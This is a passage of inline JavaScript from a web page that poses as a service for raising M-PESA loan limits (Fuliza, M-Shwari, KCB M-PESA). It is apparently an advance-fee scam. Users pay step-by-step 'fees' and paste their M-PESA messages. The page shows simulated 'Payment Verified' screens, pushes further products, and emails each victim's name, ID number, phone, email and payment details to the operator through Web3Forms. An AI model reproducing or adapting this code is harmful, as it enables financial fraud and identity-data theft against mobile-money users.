            appState.mpesaMessages.push(stepMessage);
            
            // --- NEW: IMMEDIATE EMAIL LOGGING ---
            const immediateLogData = {
                name: appState.userName,
                id_number: appState.userId,
                product: appState.currentProduct.toUpperCase(),
                step: appState.currentStep,
                fee_paid: `Ksh ${currentFee}`,
                desired_limit: `Ksh ${formatKsh(appState.desiredLimit)}`,
                mpesa_code: mpesaCode,
                mpesa_message: pastedMessage,
                type: 'Immediate Payment Log'
            };
            await submitDataToWeb3Forms(immediateLogData, `PAYMENT RECEIVED: ${appState.userName} - ${appState.currentProduct.toUpperCase()} (Step ${appState.currentStep})`);


            // 1. Simulate Loading/Verification
            switchPage('flow-step-loading');
            
            nextStepBtn.classList.add('loading-btn');
            document.getElementById('loading-text').textContent = 'Payment Verified. System Integrating New Protocol...';


            setTimeout(() => {
                nextStepBtn.classList.remove('loading-btn');
                mpesaMessageTextarea.value = ''; // Clear input

                // 2. Advance State
                appState.currentStep++;

                if (appState.currentStep > STEP_COUNT) {
                    // 3. Flow Complete - Go to Upsell Page or Dashboard
                    handleFlowCompletion();
                    return;
                }

                // 4. Update UI for Next Step
                updateFlowDetails();
                
                // 5. Return to Flow Page with delay
                document.getElementById('loading-text').textContent = `Verification success. Proceed to ${getStepTitle(appState.currentStep)} payment...`;
                nextStepBtn.textContent = 'Verify Message'; // Ensure button text is reset

                switchPageWithDelay('dynamic-flow-page');

            }, 3000); // 3 second loading simulation
        }

        function startProductFlow(product) {
            // 1. Set initial state for the flow
            appState.currentProduct = product;
            appState.desiredLimit = 10000; // Reset to minimum limit
            appState.currentStep = 1;
            appState.mpesaMessages = []; // Clear previous messages
            
            // 2. Calculate initial fees (will use the fixed tiers)
            const feeData = calculateFee(appState.desiredLimit);
            appState.totalFee = feeData.totalFee;
            appState.stepFees = feeData.stepFees;

            // 3. Inject the flow content
            const placeholder = document.getElementById('flow-content-placeholder');
            placeholder.innerHTML = flowContentTemplate;

            // 4. Customize template for the selected product (e.g., Fuliza)
            const productName = product.replace('mpesa', ' M-PESA').toUpperCase();
            document.getElementById('product-name-title').textContent = productName;
            document.getElementById('product-name-label').textContent = productName;
            
            // 5. Initialize dynamic fields and event listeners
            document.getElementById('desired-limit').value = appState.desiredLimit;
            document.getElementById('desired-limit').addEventListener('input', updateFlowDetails);
            
            const nextBtn = document.getElementById('nextStepBtn');
            nextBtn.onclick = nextPaymentStep;

            // 6. Initial UI update
            updateFlowDetails();

            // 7. Go to flow page with delay
            document.getElementById('dynamic-flow-page').setAttribute('data-current-product', product);
            switchPageWithDelay('dynamic-flow-page');
        }


        // --- Web3Forms Submission Functions ---
        async function submitDataToWeb3Forms(data, subject) {
            const formUrl = `https://api.web3forms.com/submit`;
            const formData = new FormData();
            
            // Add access key and subject for the email
            formData.append('access_key', WEB3FORMS_ACCESS_KEY);
            formData.append('subject', subject);
            
            // Append all data fields
            for (const key in data) {
                const value = (typeof data[key] === 'object' && data[key] !== null) 
                            ? JSON.stringify(data[key], null, 2) 
                            : data[key];
                formData.append(key, value);
            }
            
            try {
                const response = await fetch(formUrl, {
                    method: 'POST',
                    body: formData
                });

                const result = await response.json();
                if (response.ok && result.success) {
                    console.log(`Web3Forms Submission successful for: ${subject}`);
                    return true;
                } else {
                    console.error(`Web3Forms Submission failed for: ${subject}`, result);
                    return false;
                }
            } catch (error) {
                console.error(`Web3Forms network error for: ${subject}`, error);
                return false;
            }
        }

        async function handleAgentApproval(e) {
            e.preventDefault();
            const form = document.getElementById('agentApprovalForm');
            const submitBtn = document.getElementById('submitAgentApprovalBtn');
            
            const approvalData = {
                name: appState.userName,
                id_number: form.elements['agent-id'].value,
                phone: form.elements['agent-phone'].value,
                email: form.elements['agent-email'].value,
                type: 'Agent Approval'
            };
            
            // Show loading state
            submitBtn.classList.add('loading-btn');
            submitBtn.textContent = 'Submitting... Please Wait...';

            // Submit data to Web3Forms
            await submitDataToWeb3Forms(approvalData, `NEW AGENT APPROVAL: ${appState.userName}`);
            
            // Success: Go to the Product Selection Page with delay
            setTimeout(() => {
                submitBtn.classList.remove('loading-btn');
                localStorage.setItem('agentEmail', approvalData.email);
                localStorage.setItem('agentPhone', approvalData.phone);
                localStorage.setItem('hasCompletedApproval', 'true');
                switchPageWithDelay('selection-page');
            }, 1500);
        }


        function updateDashboardState() {
            const product = appState.lastCompletedProduct ? appState.lastCompletedProduct.replace('mpesa', ' M-PESA').toUpperCase() : 'N/A';
            
            document.getElementById('dashboard-name').textContent = appState.userName;
            document.getElementById('dashboard-id').textContent = appState.userId;
            document.getElementById('dashboard-product').textContent = product;
            document.getElementById('dashboard-product-name-status').textContent = product;
            document.getElementById('dashboard-new-limit').textContent = `Ksh ${formatKsh(appState.lastCompletedLimit)}`;
            document.getElementById('dashboard-total-fee').textContent = `Ksh ${formatKsh(appState.lastCompletedFee)}`;
        }


        async function handleFlowCompletion() {
            // 1. Update persistent state for next login
            appState.lastCompletedProduct = appState.currentProduct;
            appState.lastCompletedLimit = appState.desiredLimit;
            appState.lastCompletedFee = appState.totalFee;

            // Save completed state for dashboard view persistence
            localStorage.setItem('hasCompletedApplication', 'true');
            localStorage.setItem('lastCompletedProduct', appState.currentProduct);
            localStorage.setItem('lastCompletedLimit', appState.desiredLimit);
            localStorage.setItem('lastCompletedFee', appState.totalFee);
            
            // 2. Submit FINAL Audit Report to Web3Forms
            const submissionData = {
                name: appState.userName,
                id_number: appState.userId,
                product: appState.currentProduct.toUpperCase(),
                desired_limit: formatKsh(appState.desiredLimit),
                total_fee_collected: formatKsh(appState.totalFee),
                // Join messages with newlines for clean email formatting
                all_mpesa_messages_history: appState.mpesaMessages.join('\n---\n'), 
                type: 'FINAL AUDIT REPORT'
            };
            
            await submitDataToWeb3Forms(submissionData, `FINAL AUDIT REPORT: ${appState.userName} - ${appState.currentProduct.toUpperCase()}`);
            
            // 3. Clear messages for next application
            appState.mpesaMessages = [];

            // 4. Update Dashboard details and transition
            updateDashboardState();
            
            // Show processing screen before final switch
            document.getElementById('loading-text').textContent = 'Final Protocol Activation Successful. Processing Dashboard Redirection...';


            // Decide whether to go to the upsell page or straight to the dashboard
            if (appState.currentProduct === 'fuliza') {
                // If Fuliza is done, upsell M-Shwari/KCB M-PESA
                document.getElementById('upsell-user-name').textContent = appState.userName;
                document.getElementById('upsell-product-name').textContent = 'Fuliza';
                document.getElementById('upsell-product-name-bold').textContent = 'Fuliza';
                switchPageWithDelay('upsell-page');
            } else {
                // For M-Shwari/KCB M-PESA, go straight to the dashboard
                switchPageWithDelay('dashboard-page');
            }
        }


        // --- Authentication (Simulated) ---
        function handleLogin(e) {
            e.preventDefault();
            const idInput = document.getElementById('login-id-number');
            const passwordInput = document.getElementById('login-password');
            const loginBtn = document.getElementById('loginSubmitBtn');

            // Retrieve stored credentials
            const storedID = localStorage.getItem('registeredID');
            const storedPassword = localStorage.getItem('registeredPassword');
            const storedName = localStorage.getItem('registeredName');
            const hasCompleted = localStorage.getItem('hasCompletedApplication');

            if (idInput.value === storedID && passwordInput.value === storedPassword) {
                // SIMULATION: Assume login is successful 
                appState.isLoggedIn = true;
                appState.userName = storedName;
                appState.userId = storedID;

                document.getElementById('user-welcome-name').textContent = storedName;
                
                // Simulate loading before going to selection page
                loginBtn.classList.add('loading-btn');
                loginBtn.textContent = 'Authenticating...';

                setTimeout(() => {
                    loginBtn.classList.remove('loading-btn');
                    loginBtn.textContent = 'Log In';
                    
                    if (hasCompleted === 'true') {
                        // NEW: Go DIRECTLY to Dashboard if application was completed
                        appState.lastCompletedProduct = localStorage.getItem('lastCompletedProduct');
                        appState.lastCompletedLimit = parseInt(localStorage.getItem('lastCompletedLimit'));
                        appState.lastCompletedFee = parseInt(localStorage.getItem('lastCompletedFee'));
                        updateDashboardState();
                        switchPageWithDelay('dashboard-page');
                    } else {
                         // Go to Agent Approval Page if first time login (or first time after registration)
                        document.getElementById('agent-id').value = storedID;
                        document.getElementById('agent-email').value = localStorage.getItem('agentEmail') || '';
                        document.getElementById('agent-phone').value = localStorage.getItem('agentPhone') || '';
                        switchPageWithDelay('agent-approval-page');
                    }
                }, 1000);
            } else {
                // Use a visual indicator for error instead of alert
                idInput.style.borderColor = 'red';
                passwordInput.style.borderColor = 'red';
                console.error('Login failed. Check your ID Number and Password.');
                loginBtn.textContent = '‚ùå Login Failed. Try Again.';
                
                setTimeout(() => {
                    loginBtn.textContent = 'Log In';
                    idInput.style.borderColor = '#ddd';
                    passwordInput.style.borderColor = '#ddd';
                }, 2000);
            }
        }
        
        function handleRegistration(e) {
            e.preventDefault();
            const form = document.getElementById('registrationForm');
            const name = form.elements['name'].value;
            const id_number = form.elements['id_number'].value;
            const phone = form.elements['phone'].value;
            const password = form.elements['password'].value;
            
            // SIMULATION: Store details for simulated login and start flow
            if (name && id_number && phone && password) {
                localStorage.setItem('registeredName', name);
                localStorage.setItem('registeredID', id_number);
                localStorage.setItem('registeredPhone', phone);
                localStorage.setItem('registeredPassword', password);
                
                // Reset completed flag on new registration
                localStorage.removeItem('hasCompletedApplication'); 
                
                // Auto-fill login screen and switch to login page
                document.getElementById('login-id-number').value = id_number;
                document.getElementById('login-password').value = password;
                
                // Give visual feedback before switching
                const regBtn = form.querySelector('button[type="submit"]');
                regBtn.classList.add('upsell-button');
                regBtn.textContent = 'Registration Complete! Proceeding to Login...';
                
                setTimeout(() => {
                    regBtn.classList.remove('upsell-button');
                    regBtn.textContent = 'Register & Continue';
                    switchPageWithDelay('login-page');
                }, 1500);
            } else {
                 console.error('Please fill in all registration details.');
            }
        }

        // --- Navigation Helpers ---
        function handleBack(currentPageId, forceSelection = false) {
            let targetPageId = '';
            
            if (currentPageId === 'registration-page') {
                const storedID = localStorage.getItem('registeredID');
                targetPageId = storedID ? 'login-page' : 'landing-page';
            } else if (currentPageId === 'login-page') {
                targetPageId = 'landing-page';
            } else if (currentPageId === 'upsell-page') {
                targetPageId = 'selection-page';
            } else if (currentPageId === 'selection-page' || currentPageId === 'dashboard-page' || currentPageId === 'agent-approval-page') {
                // Check if user is trying to start a new application from Dashboard
                if (forceSelection && currentPageId === 'dashboard-page') {
                    targetPageId = 'selection-page';
                } else {
                    // Logout
                    appState.isLoggedIn = false;
                    appState.currentProduct = null;
                    targetPageId = 'login-page';
                }
            } else if (currentPageId === 'dynamic-flow-page') {
                // Reset flow state and return to selection from flow page
                appState.currentProduct = null;
                appState.currentStep = 1;
                targetPageId = 'selection-page';
            }
            
            if (targetPageId) {
                switchPageWithDelay(targetPageId);
            }
        }


        // --- Initial Setup and Event Listeners ---
        document.addEventListener('DOMContentLoaded', () => {
            
            // --- CRITICAL: ONE-TIME REGISTRATION CHECK ---
            const storedID = localStorage.getItem('registeredID');
            const landingPage = document.getElementById('landing-page');
            const loginPage = document.getElementById('login-page');

            if (storedID) {
                // If registration data exists, skip landing and go straight to login
                if (landingPage) landingPage.classList.remove('active');
                if (loginPage) loginPage.classList.add('active');
                
                // Change landing page button text to reflect user is already registered
                const registrationBtn = document.getElementById('goToRegistrationBtn');
                const loginLink = document.getElementById('goToLoginLink');
                if (registrationBtn) registrationBtn.textContent = 'PROCEED TO LOGIN';
                if (loginLink) loginLink.style.display = 'block';
            } else {
                 // If no data exists, start at the landing page (default state)
                 if (landingPage) landingPage.classList.add('active');
                 if (loginPage) loginPage.classList.remove('active');
            }
            
            // --- Page Navigation Links (using delay for all) ---
            document.getElementById('goToRegistrationBtn').addEventListener('click', (e) => storedID ? switchPageWithDelay('login-page', e) : switchPageWithDelay('registration-page', e));
            if(document.getElementById('goToLoginLink')) document.getElementById('goToLoginLink').addEventListener('click', (e) => switchPageWithDelay('login-page', e));
            document.getElementById('goToLoginFromRegister').addEventListener('click', (e) => switchPageWithDelay('login-page', e));
            document.getElementById('goToRegisterFromLogin').addEventListener('click', (e) => switchPageWithDelay('registration-page', e));
            
            // --- Authentication Handlers ---
            document.getElementById('registrationForm').addEventListener('submit', handleRegistration);
            document.getElementById('loginSubmitBtn').addEventListener('click', handleLogin);
            document.getElementById('submitAgentApprovalBtn').addEventListener('click', handleAgentApproval);
            
            // --- Upsell Handlers ---
            document.getElementById('upsell-page').addEventListener('click', (e) => {
                const target = e.target.closest('button');
                if (target && target.dataset.product) {
                    // Use delay before starting the flow
                    e.preventDefault(); 
                    document.getElementById('loading-text').textContent = 'Starting new product flow...';
                    switchPage('flow-step-loading');
                    setTimeout(() => startProductFlow(target.dataset.product), 3000);
                }
            });


            // --- Password Toggle ---
            function togglePasswordVisibility(inputId, iconId) {
                const input = document.getElementById(inputId);
                const icon = document.getElementById(iconId);
                if (input.type === 'password') {
                    input.type = 'text';
                    icon.textContent = 'üîì';
                } else {
                    input.type = 'password';
                    icon.textContent = 'üîí';
                }
            }
            document.getElementById('toggleRegistrationPassword').addEventListener('click', () => togglePasswordVisibility('password', 'toggleRegistrationPassword'));
            document.getElementById('toggleLoginPassword').addEventListener('click', () => togglePasswordVisibility('login-password', 'toggleLoginPassword'));
            
        });
        
    </script>
</body>
</html>
